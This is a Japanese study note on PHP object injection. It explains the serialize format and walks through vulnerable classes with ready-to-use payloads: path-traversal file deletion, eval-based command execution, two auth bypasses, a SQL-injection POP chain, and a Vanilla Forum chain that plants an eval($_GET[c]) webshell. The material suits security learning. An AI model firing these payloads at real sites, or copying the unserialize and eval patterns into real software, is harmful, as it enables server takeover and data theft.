<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [Unserialize](#unserialize)
  - [Serializeの基本](#serialize%E3%81%AE%E5%9F%BA%E6%9C%AC)
  - [__destruct](#__destruct)
  - [__wakeup](#__wakeup)
  - [AuthBypass TypeJuggling](#authbypass-typejuggling)
  - [AuthBypass ObjectReference](#authbypass-objectreference)
  - [POP chain](#pop-chain)
    - [__toString (SQL Injection)](#__tostring-sql-injection)
    - [__destruct (webshell)](#__destruct-webshell)
- [参考](#%E5%8F%82%E8%80%83)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# Unserialize
## Serializeの基本
```php
<?php
class Example1{
    public $cache_file;
}
class Example2{
    public $cache_file;
    public $array = array("key" => 100);
}

$ex1 = new Example1();
echo serialize($ex1)."\n";  // O:8:"Example1":1:{s:10:"cache_file";N;}
$ex1->cache_file = "index.php";
echo serialize($ex1)."\n";  // O:8:"Example1":1:{s:10:"cache_file";s:9:"index.php";}

$ex2 = new Example2();
echo serialize($ex2)."\n";  // O:8:"Example2":2:{s:10:"cache_file";N;s:5:"array";a:1:{s:3:"key";i:100;}}

// O:8:"Example2":2:{s:10:"cache_file";N;s:5:"array";a:1:{s:3:"key";i:100;}}
// Oは「”Example2”というObjectをシリアル化している」の意味
// 8は”Example2”の文字数
// 2は「フィールドが二つある」の意味
// sはStringの意味？
// 10は"cache_file"の文字数
// Nは値がセットされていないという意味。{変数名;値}でワンセットっぽい
// 最後の"i:100;"はint型の値100という意味
?>
```
## __destruct
```php
class Example1
{
   public $cache_file;

   function __construct(){
      // some PHP code...
   }
   // インスタンス削除時にデストラクタを実行して$cache_fileを削除する
   function __destruct(){
      $file = "/var/www/cache/tmp/{$this->cache_file}";
      if (file_exists($file)) @unlink($file);
   }
}

// some PHP code...

// GETメソッドの?data=以降の値をデシリアライズする
$user_data = unserialize($_GET['data']);

// some PHP code..
```
以下で、Example1クラスのオブジェクトとして復元して、Example1クラスのインスタンスを`$user_data`に代入するので、`$user_data`インスタンスが削除されるときに`../../index.php`が削除されてしまう！   
```txt
http://testsite.com/vuln.php?data=O:8:"Example1":1:{s:10:"cache_file";s:15:"../../index.php";}
```
## __wakeup

```php
<?php 
    class PHPObjectInjection{
        public $inject;
        function __construct(){
        }
        // このクラスをunserializeするときに__wakeup()を実行する
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);  // こんなことする場合ってあるのか？？
            }
        }
    }
    // $_REQUEST['r']はGETとPOSTとCOOKIEを合わせた連想配列。$_GET['r']とかと同じ
    if(isset($_REQUEST['r'])){  
        $var1=unserialize($_REQUEST['r']);
        if(is_array($var1)){
            echo "<br/>".$var1[0]." - ".$var1[1];
        }
    }
    else{
        echo ""; # nothing happens here
    }
?>
```
GETのデータとかCookieのデータとかで`system("whoami")`を実行する。   
```txt
?r=O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}
Cookie: r=O%3A18%3A%22PHPObjectInjection%22%3A1%3A%7Bs%3A6%3A%22inject%22%3Bs%3A17%3A%22system%28%27whoami%27%29%3B%22%3B%7D
```
## AuthBypass TypeJuggling
```php
// 一見、どう見ても安全に見えるが実はがちがちに脆弱。ヤバすぎてワロタ
data = unserialize($_COOKIE['auth']);

// "=="で比較しているため、TypeJugglingにより、 true(boolean) == "admin"(string) はTrueとなるので危険！
if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
    $admin = true;
} else {
    $admin = false;
}
```
以下でAuthBypassのためのPayloadを作成。   
```php
<?php
$data = array("username" => true, "password" => true);
echo serialize($data)."\n"; // a:2:{s:8:"username";b:1;s:8:"password";b:1;}

// "username"のValueの値をBooleanのTrueにするとTypeJugglingによりAuthBypassできる！
echo gettype(true == "admin")." : ".(true == "admin")."\n";  // boolean : 1
echo gettype(true === "admin")." : ".(true === "admin")."\n"; // boolean : 
?>
```
作成した`a:2:{s:8:"username";b:1;s:8:"password";b:1;}`をURL encodeしてCookieにセットすればBypassできる！   
```txt
Cookie: auth=a%3A2%3A%7Bs%3A8%3A%22username%22%3Bb%3A1%3Bs%3A8%3A%22password%22%3Bb%3A1%3B%7D
```
## AuthBypass ObjectReference
```php
<?php
class Object1{
  var $guess;
  var $secretCode;
}

$obj = unserialize($_GET['input']);

if($obj) {
    $obj->secretCode = rand(500000,999999);
    if($obj->guess === $obj->secretCode) {
        echo "Win";
    }
}
?>
```
以下で`$secretCode`と`$code`が同じ値を指すように参照代入したシリアライズデータを作成する。   
```php
<?php
class Object1{
    public $secretCode = "a";
    public $code;
    //public $code = &$secretCode;  // ここでやろうとするとerror。コンストラクタ内でやらないとだめらしい
    public function __construct(){
        // リファレンス(参照)代入。これで$secretCodeと$codeが同じ値を指すようになった！
        $this->code = &$this->secretCode;
    }
}
$obj1 = new Object1();
echo serialize($obj1);  // O:7:"Object1":2:{s:10:"secretCode";s:1:"a";s:4:"code";R:2;}
?>
```
以下で認証を突破できる！   
```txt
?input=O:7:"Object1":2:{s:10:"secretCode";s:1:"a";s:4:"code";R:2;}
```
## POP chain 
### __toString (SQL Injection)
```php
<?php
class Example3{
   protected $obj;

   function __construct(){
      // some PHP code...
   }
   // Exampleクラスのインスタンスが文字列として呼びだされたときに__toString()を実行
   function __toString(){
      if (isset($this->obj)) {
          // $this->objはインスタンスであるとして、そのインスタンスのgetValueメソッドを実行
          return $this->obj->getValue();
      }else{
          return "__toString else";
      }
   }
}

class SQL_Row_Value
{
   private $_table;
   private $id;

   // some PHP code...
   // getValue($id)とすると上の__toString内では引数無しで呼び出してるからエラーになる
   function getValue()
   {
      $sql = "SELECT * FROM {$this->_table} WHERE id = ".(int)$this->id;
      return $sql;
   }
}

// これをデシリアライズすればSQLインジェクションができる！
$user_data = unserialize('O:8:"Example3":1:{s:3:"obj";O:13:"SQL_Row_Value":2:{s:6:"_table";s:10:"users -- -";s:2:"id";i:2;}}');
echo $user_data;

// 実際に実行されるSQLクエリ
// SELECT * FROM users -- - WHERE id = 2
?>
```
以下でPayloadを作成するが、細部がうまいこといってないので手動で修正する。   
```php
<?php
class SQL_Row_Value{
   private $_table ="users -- -";
}

class Example3{
   protected $obj;

   function __construct()   {
      $this->obj = new SQL_Row_Value;
   }
}

print (serialize(new Example3));

// O:8:"Example3":1:{s:6:" * obj";O:13:"SQL_Row_Value":1:{s:21:"SQL_Row_Value_table";s:10:"users -- -";}}
?>
```
### __destruct (webshell)
https://hackerone.com/reports/407552   

以下が最終的なpopchianのコード。   
デシリアライズするとき、`Gdn_Configuration`のインスタンスが作成されてコンストラクタが実行され、`new Gdn_ConfigurationSource()`によって`Gdn_ConfigurationSource`のインスタンスが作成される。   
`Gdn_ConfigurationSource`のインスタンスが作成されるとコンストラクタが実行され、各種フィールドに値がセットされる。   
```php
class Gdn_ConfigurationSource{
    public function __construct(){
        $this->Type = "file";
        $this->Source = "/var/www/html/conf/constants.php";
        $this->Group = 'a=eval($_GET[c]);//';
        $this->Settings[""] = "";       
        $this->Dirty = true;
        $this->ClassName = "Gdn_ConfigurationSource";
    }
}
class Gdn_Configuration {
    public $sources = [];
    public function __construct(){
        $this->sources['si'] = new Gdn_ConfigurationSource();
    }
}
// serialize(new Gdn_Configuration);
```

`Gdn_Configuration`クラスのデストラクタが呼ばれるのがentrypoint。   
[2]でshutdowm()メソッドが呼ばれて[3]が実行される。    
[3]ではshutdown()メソッドの中でshutdown()メソッドが呼ばれてる。これは多分別のクラスのshutdown()メソッドを探すことになるはず？？ここでは別の`Gdn_ConfigurationSource`クラスにあるshutdown()メソッドが該当する。     
上記のpopchainによって、`$source->shutdown(); // 3`の`$source`に`new Gdn_ConfigurationSource()`がセットされ、`インスタンス->shutdown()`となって`Gdn_ConfigurationSource`の`shutdown()`メソッドを実行できる！(実際に実行されるのはデストラクタが呼ばれるとき)   
```php
class Gdn_Configuration extends Gdn_Pluggable {

    ...

    /**
     *
     */
    public function __destruct() {
        if ($this->autoSave) {                      // 1
            $this->shutdown();                      // 2
        }
    }

    /**
     *
     */
    public function shutdown() {
        foreach ($this->sources as $source) {
            $source->shutdown();                    // 3
        }
    }
```
そして以下の`save()`メソッドが実行される。   
[6]のswitchで`$this->Type`の値が`'file'`のとき、[7]で`$group`に`'a=eval($_GET[c]);//'`がセットされる。   
次に[8]で`$options`連想配列に`'VarialbleName'`のValueとして値がセットされる。   
次に[9]で`array_merge()`で別の情報も`$options`に統合される。   
次に[10]で`Gdn_Configuration::format($data, $options)`で`'VarialbleName'`のValueをグローバル変数として設定するらしい。つまり、`$`にValueを追加した`$a=eval($_GET[c]);//`がグローバル変数名として設定される。また、これらをファイルの中身として`$fileContents`に保存する。   
[11]でランダムに作成した`$tmpFile`ファイルに`$fileContents`を書き込む。   
[12]で`$this->Source`にセットされた`"/var/www/html/conf/constants.php"`にファイル名を書き換える。これでWebshellが設置できる！   

```php
class Gdn_ConfigurationSource extends Gdn_Pluggable {

    ...

    /**
     *
     * 
     * @return bool|null
     * @throws Exception
     */
    public function save() {
        if (!$this->Dirty) {
            return null;
        }

        $this->EventArguments['ConfigDirty'] = &$this->Dirty;
        $this->EventArguments['ConfigNoSave'] = false;
        $this->EventArguments['ConfigType'] = $this->Type;
        $this->EventArguments['ConfigSource'] = $this->Source;
        $this->EventArguments['ConfigData'] = $this->Settings;
        $this->fireEvent('BeforeSave');

        if ($this->EventArguments['ConfigNoSave']) {
            $this->Dirty = false;
            return true;
        }

        // Check for and fire callback if one exists
        if ($this->Callback && is_callable($this->Callback)) {
            $callbackOptions = [];
            if (!is_array($this->CallbackOptions)) {
                $this->CallbackOptions = [];
            }

            $callbackOptions = array_merge($callbackOptions, $this->CallbackOptions, [
                'ConfigDirty' => $this->Dirty,
                'ConfigType' => $this->Type,
                'ConfigSource' => $this->Source,
                'ConfigData' => $this->Settings,
                'SourceObject' => $this
            ]);

            $configSaved = call_user_func($this->Callback, $callbackOptions);

            if ($configSaved) {
                $this->Dirty = false;
                return true;
            }
        }

        switch ($this->Type) {                              // 6
            case 'file':
                if (empty($this->Source)) {
                    trigger_error(errorMessage('You must specify a file path to be saved.', 'Configuration', 'Save'), E_USER_ERROR);
                }

                $checkWrite = $this->Source;
                if (!file_exists($checkWrite)) {
                    $checkWrite = dirname($checkWrite);
                }

                if (!is_writable($checkWrite)) {
                    throw new Exception(sprintf(t("Unable to write to config file '%s' when saving."), $this->Source));
                }

                $group = $this->Group;                                                              // 7
                $data = &$this->Settings;
                if ($this->Configuration) {
                    ksort($data, $this->Configuration->getSortFlag());
                }

                // Check for the case when the configuration is the group.
                if (is_array($data) && count($data) == 1 && array_key_exists($group, $data)) {
                    $data = $data[$group];
                }

                // Do a sanity check on the config save.
                if ($this->Source == Gdn::config()->defaultPath()) {
                    // Log root config changes
                    try {
                        $logData = $this->Initial;
                        $logData['_New'] = $this->Settings;
                        LogModel::insert('Edit', 'Configuration', $logData);
                    } catch (Exception $ex) {
                    }

                    if (!isset($data['Database'])) {
                        if ($pm = Gdn::pluginManager()) {
                            $pm->EventArguments['Data'] = $data;
                            $pm->EventArguments['Backtrace'] = debug_backtrace();
                            $pm->fireEvent('ConfigError');
                        }
                        return false;
                    }
                }

                $options = [
                    'VariableName' => $group,                                                   // 8
                    'WrapPHP' => true,
                    'ByLine' => true
                ];

                if ($this->Configuration) {
                    $options = array_merge($options, $this->Configuration->getFormatOptions());             // 9
                }

                // Write config data to string format, ready for saving
                $fileContents = Gdn_Configuration::format($data, $options);                                 // 10

                if ($fileContents === false) {
                    trigger_error(errorMessage('Failed to define configuration file contents.', 'Configuration', 'Save'), E_USER_ERROR);
                }

                // Save to cache if we're into that sort of thing
                $fileKey = sprintf(Gdn_Configuration::CONFIG_FILE_CACHE_KEY, $this->Source);
                if ($this->Configuration && $this->Configuration->caching() && Gdn::cache()->type() == Gdn_Cache::CACHE_TYPE_MEMORY && Gdn::cache()->activeEnabled()) {
                    $cachedConfigData = Gdn::cache()->store($fileKey, $data, [
                        Gdn_Cache::FEATURE_NOPREFIX => true,
                        Gdn_Cache::FEATURE_EXPIRY => 3600
                    ]);
                }

                $tmpFile = tempnam(PATH_CONF, 'config');
                $result = false;
                if (file_put_contents($tmpFile, $fileContents) !== false) {                                 // 11
                    chmod($tmpFile, 0775);
                    $result = rename($tmpFile, $this->Source);                                              // 12
                }
```
実際に設置されたWebshellは以下の感じらしい。   
```txt
steven@pluto:/var/www/html/conf$ cat constants.php 
<?php if (!defined('APPLICATION')) exit();
$a=eval($_GET[c]);//[''] = '';

// Last edited by admin (172.16.175.1)2018-09-08 20:35:19
```
# 参考
https://securitycafe.ro/2015/01/05/understanding-php-object-injection/   
基本的な説明。わかりやすい。   
https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/   
具体例がたくさん。よさげ。   
https://hackerone.com/reports/407552   
Vanilla Forumのpop chainのガジェット。   

